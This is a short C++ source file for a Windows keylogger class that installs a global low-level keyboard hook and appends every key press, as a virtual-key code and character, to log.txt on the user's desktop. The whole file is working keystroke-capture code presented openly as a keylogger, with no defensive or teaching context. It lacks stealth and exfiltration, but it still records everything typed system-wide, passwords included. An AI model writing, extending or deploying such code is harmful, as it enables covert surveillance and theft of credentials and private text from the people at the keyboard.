#include "Includes.h"
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

LRESULT Keylogger::HookProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;
        
        WCHAR desktopPath[MAX_PATH];
        WCHAR fullPath[MAX_PATH];
        if (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) == S_OK) {
            wsprintfW(fullPath, L"%s\\log.txt", desktopPath);

            std::wofstream logFile;
            logFile.open(fullPath, std::ios::app);
            if (logFile.is_open()) {
                logFile << L"Key was pressed: " << vkCode << L" (char: " << (WCHAR)vkCode << L")" << std::endl;
                logFile.close();
            }
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

int Keylogger::Init() {
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, Keylogger::HookProc, NULL, 0);
    if (hhook == NULL) { MessageBoxA(0, "Hook wasn't installed", "Keylogger", MB_ICONERROR | MB_OK); return -1; }

    MSG msg;
    BOOL bRet;
    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
        if (bRet == -1) { MessageBoxA(0, "bRet is -1", "Keylogger", MB_ICONERROR | MB_OK); return -1; }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
